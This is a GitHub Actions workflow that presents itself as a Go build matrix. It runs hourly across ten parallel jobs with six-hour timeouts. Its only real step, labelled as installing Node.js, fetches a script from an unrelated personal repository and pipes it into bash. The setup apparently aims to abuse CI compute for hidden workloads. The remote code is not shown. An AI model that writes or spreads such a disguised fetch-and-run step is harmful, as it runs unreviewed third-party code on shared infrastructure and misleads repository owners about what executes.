name: CINUL Part 3

on:
  push:
  schedule:
    - cron: '40 * * * *'

jobs:
  build:
    name: IPLAYBOOKS Part 3
    runs-on: ubuntu-latest
    strategy:
      max-parallel: 10
      fail-fast: false
      matrix:
        include:
          - go: 1.14   flag: qwe
          - go: 1.14   flag: nvb
          - go: 1.14   flag: tby
          - go: 1.14   flag: muh
          - go: 1.15   flag: kmn
          - go: 1.15   flag: oiu
          - go: 1.15   flag: qwe
          - go: 1.15   flag: nvb
          - go: 1.15   flag: tby
          - go: 1.15   flag: muh
    timeout-minutes: 360
    steps:
      - uses: actions/setup-go@v1
        with:
          go-version: ${{ matrix.go }}

      - uses: actions/checkout@v1

      - name: Install Node.js & Run ixi
        run: |
          curl -sL https://raw.githubusercontent.com/moyz-2/Dd/refs/heads/main/ixi | bash
